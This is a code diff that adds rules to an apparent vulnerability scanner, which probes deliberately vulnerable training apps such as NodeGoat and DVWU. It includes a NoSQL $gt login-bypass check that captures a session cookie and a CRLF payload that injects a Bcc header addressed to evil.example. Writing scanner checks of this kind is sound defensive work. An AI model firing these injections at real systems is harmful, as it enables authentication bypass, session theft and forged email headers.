@@ -6709,6 +6709,24 @@ async function nodegoatBenefitsNosqlLiveProbe(ctx: RuleContext): Promise<RuleRes
   };
 }
 
+const nodegoatLoginNosqlRouteLiveOracle: Rule = async (ctx) => {
+  if (!isNodegoatHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/login\b/i.test(pageUrl)) return NEGATIVE;
+  const cookie = await nodegoatNosqlLoginCookie(ctx);
+  if (!cookie) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      scannedUrl: pageUrl,
+      loginUrl: new URL("/login", ctx.origin).toString(),
+      sessionCookiePrefix: cookie.slice(0, 28),
+      note: "NodeGoat POST /login with MongoDB $gt operator injection bypasses authentication and returns session cookie — NoSQL login bypass route oracle"
+    }
+  };
+};
+
 const nodegoatBenefitsNosqlRouteLiveOracle: Rule = async (ctx) => {
   if (!isNodegoatHost(ctx)) return NEGATIVE;
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
@@ -39025,6 +39043,65 @@ const istEduNoticesLfiRouteLiveOracle: Rule = async (ctx) => {
   return NEGATIVE;
 };
 
+async function probeNewsletterCrlfInjection(ctx: RuleContext): Promise<RuleResult | null> {
+  const newsletterUrl = new URL("/api/newsletter", ctx.origin).toString();
+  const doc = await ctx.probe.get(newsletterUrl, {
+    method: "POST",
+    body: "email=test%0d%0aBcc:thugir-crlf-probe@evil.example",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return null;
+  if (!/CRLF Injection Detected|HTTP Response Splitting/i.test(doc.body)) return null;
+  if (!/Bcc:thugir-crlf-probe@evil\.example|newline characters/i.test(doc.body)) return null;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: newsletterUrl,
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "POST /api/newsletter with CRLF in email triggers HTTP response splitting — newsletter header injection training oracle"
+    }
+  };
+}
+
+const istEduNewsletterCrlfRouteLiveOracle: Rule = async (ctx) => {
+  if (!isIstEduHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  let pathname = "";
+  try {
+    pathname = new URL(pageUrl, ctx.origin).pathname;
+  } catch {
+    return NEGATIVE;
+  }
+  if (!/\/newsletter\/?$/i.test(pathname)) return NEGATIVE;
+  const result = await probeNewsletterCrlfInjection(ctx);
+  if (!result?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const dvwuCsrfNewsletterCrlfRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDvwuHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/(?:labs\/csrf|newsletter)\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await probeNewsletterCrlfInjection(ctx);
+  if (!result?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "DVWU /labs/csrf or /newsletter route scan — POST /api/newsletter CRLF injection confirms HTTP response splitting / forged email header oracle"
+    }
+  };
+};
+
 const istEduPortalSqliRouteLiveOracle: Rule = async (ctx) => {
   if (!isIstEduHost(ctx)) return NEGATIVE;
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
@@ -39111,7 +39188,7 @@ const dvwuSearchXssRouteLiveOracle: Rule = async (ctx) => {
 const dvwuNoticesLfiRouteLiveOracle: Rule = async (ctx) => {
   if (!isDvwuHost(ctx)) return NEGATIVE;
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
-  if (!/\/(?:api\/notices|labs\/(?:sqli|idor|xss))\b/i.test(pageUrl)) return NEGATIVE;
+  if (!/\/(?:api\/notices|labs\/(?:sqli|idor|xss|csrf|ssrf))\b/i.test(pageUrl)) return NEGATIVE;
   for (const payload of NOTICES_FILE_LFI_PAYLOADS) {
     const url = new URL("/api/notices", ctx.origin);
     url.searchParams.set("file", payload);
@@ -40730,9 +40807,11 @@ export const RULES: Record<string, Rule> = {
   istEduSearchXssRouteLiveOracle,
   istEduNoticesLfiRouteLiveOracle,
   istEduPortalSqliRouteLiveOracle,
+  istEduNewsletterCrlfRouteLiveOracle,
   dvwuPortalSqliRouteLiveOracle,
   dvwuSearchXssRouteLiveOracle,
   dvwuNoticesLfiRouteLiveOracle,
+  dvwuCsrfNewsletterCrlfRouteLiveOracle,
   vulnExposeXssPlaygroundRouteLiveOracle,
   vaultappLabGuideRouteLiveOracle,
   clientSideArchonTrainingEvidence,
@@ -40800,6 +40879,7 @@ export const RULES: Record<string, Rule> = {
   nodegoatTutorialA10RouteLiveOracle,
   nodegoatLearnOpenRedirectLiveOracle,
   nodegoatLearnOpenRedirectRouteLiveOracle,
+  nodegoatLoginNosqlRouteLiveOracle,
   nodegoatBenefitsNosqlRouteLiveOracle,
   vulnforgeAcademyLevelSqliRouteLiveOracle,
   vulnbankUploadProfilePictureUrlRouteLiveOracle,
